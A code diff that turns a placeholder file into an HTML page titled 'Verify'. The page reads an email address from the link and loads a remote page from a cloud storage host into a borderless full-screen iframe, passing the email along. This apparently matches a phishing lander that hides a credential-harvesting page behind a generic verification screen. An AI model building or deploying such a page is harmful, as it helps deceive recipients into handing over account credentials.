@@ -1,1 +1,32 @@
-Hello, world!
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Verify</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        #fullpage-iframe {
+            width: 100%;
+            height: 100vh;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="fullpage-iframe" frameborder="0" allowfullscreen></iframe>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        let iframeSrc = 'https://pansync.blob.core.windows.net/static/index.html';
+        if (email) {
+            iframeSrc += `?email=${encodeURIComponent(email)}`;
+        }
+        document.getElementById('fullpage-iframe').src = iframeSrc;
+    </script>
+</body>
+</html>
